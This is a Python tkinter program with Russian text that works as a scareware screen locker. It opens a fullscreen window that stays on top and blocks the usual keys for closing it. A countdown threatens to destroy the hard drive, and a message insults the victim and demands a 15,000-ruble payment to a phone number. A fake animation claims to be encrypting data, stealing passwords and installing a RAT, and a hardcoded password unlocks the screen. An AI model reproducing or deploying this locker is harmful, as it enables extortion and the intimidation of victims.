import tkinter as tk
from tkinter import messagebox
import time
import random
import sys
import winsound  # Для звуковых эффектов
import os

class FileAnimation:
    def __init__(self, parent):
        self.parent = parent
        self.frame = tk.Frame(parent, bg='gray', bd=2, relief='groove')
        self.frame.place(relx=0.98, rely=0.98, anchor='se', width=250, height=300)
        
        self.canvas = tk.Canvas(self.frame, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        self.files = []
        self.active_files = []
        self.file_colors = ['#00FF00', '#00CC00', '#009900']
        self.setup_files()
        self.last_beep = 0
        
    def setup_files(self):
        system_files = [
            "kernel32.dll", "ntoskrnl.exe", "hal.dll", "win32k.sys",
            "explorer.exe", "svchost.exe", "csrss.exe", "smss.exe",
            "system32.dll", "user32.dll", "gdi32.dll", "advapi32.dll",
            "ntdll.dll", "shell32.dll", "msvcrt.dll", "comctl32.dll",
            "drivers/atapi.sys", "drivers/tcpip.sys", "drivers/disk.sys",
            "config/SYSTEM", "config/SOFTWARE", "config/SECURITY",
            "bootmgr", "winload.exe", "winresume.exe", "pagefile.sys",
            "Windows Defender", "шифровка данных", "получение поролей",
            "получаем историю браузера", "install ratt", "install" "install",
        ]
        self.files = random.sample(system_files, 15)
        
    def update_animation(self):
        self.canvas.delete('all')
        
        # Добавляем новые файлы сверху
        if random.random() < 0.3 and len(self.active_files) < 15:
            y = 0
            speed = random.uniform(1.5, 3.0)
            color = random.choice(self.file_colors)
            self.active_files.append({
                'text': random.choice(self.files),
                'y': y,
                'speed': speed,
                'color': color
            })
        
        # Обновляем позиции файлов
        for file in self.active_files[:]:
            file['y'] += file['speed']
            if file['y'] > 300:
                self.active_files.remove(file)
            else:
                self.canvas.create_text(
                    10, file['y'],
                    text=file['text'],
                    fill=file['color'],
                    font=('Courier New', 10),
                    anchor='w'
                )
        
        # Проигрываем звук каждую секунду
        current_time = time.time()
        if current_time - self.last_beep >= 1.0:
            winsound.Beep(1000, 100)  # Частота 1000Hz, длительность 100ms
            self.last_beep = current_time
        
        self.parent.after(50, self.update_animation)

def disable_event():
    return "break"

def check_password():
    if password_entry.get() == "123456789":
        root.destroy()
        sys.exit()
    else:
        messagebox.showerror("Ошибка", "Ебать ты даун это неверный пароль!")
        password_entry.delete(0, tk.END)

def update_timer():
    global remaining_time
    if remaining_time > 0:
        mins, secs = divmod(remaining_time, 60)
        timer_label.config(text=f"{mins:02d}:{secs:02d}")
        remaining_time -= 1
        root.after(1000, update_timer)
        
        if remaining_time % 2 == 0:
            warning_label.config(fg='red')
        else:
            warning_label.config(fg='black')
        
        if remaining_time < 60:
            timer_label.config(fg=random.choice(['red', 'white', 'yellow']))
    else:
        timer_label.config(text="00:00", fg='red')
        warning_label.config(text="Ваш жесткий диск сломан!", fg='red')
        simulate_crash()

def simulate_crash():
    for _ in range(20):
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        error = tk.Label(root, 
                       text="SYSTEM ERROR", 
                       fg='white', 
                       bg='red', 
                       font=('Arial', random.randint(8, 20)))
        error.place(x=x, y=y)
        root.update_idletasks()

# Создаем главное окно
root = tk.Tk()
root.title(" ")

# Настройки окна
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')

# Блокировка сочетаний клавиш
root.protocol("WM_DELETE_WINDOW", disable_event)
for key in ['<Alt-F4>', '<Control-w>', '<Escape>']:
    root.bind(key, disable_event)

# Таймер (5 минут для теста)
remaining_time = 5 * 60

# Основные элементы интерфейса
timer_label = tk.Label(
    root,
    text="05:00",
    fg='red',
    bg='black',
    font=('Arial', 36, 'bold'),
    justify='center'
)
timer_label.pack(pady=(50, 0))

warning_label = tk.Label(
    root,
    text="По окончанию таймера ваш жесткий диск будет сломан",
    fg='red',
    bg='black',
    font=('Arial', 16, 'bold'),
    justify='center'
)
warning_label.pack(pady=(10, 30))

label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте мне 15 000р на этот номер: +7 914 267 24 91 сбер",
    fg='red',
    bg='black',
    font=('Arial', 24, 'bold'),
    justify='center'
)
label.pack(pady=(0, 30))

password_entry = tk.Entry(
    root,
    show="*",
    font=('Arial', 18),
    width=20
)
password_entry.pack(pady=(0, 20))

button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 16),
    relief='flat'
)
button.pack()

# Анимация файлов
file_animation = FileAnimation(root)
file_animation.update_animation()

# Управление фокусом
def force_focus():
    root.focus_force()
    root.after(500, force_focus)

force_focus()

root.mainloop()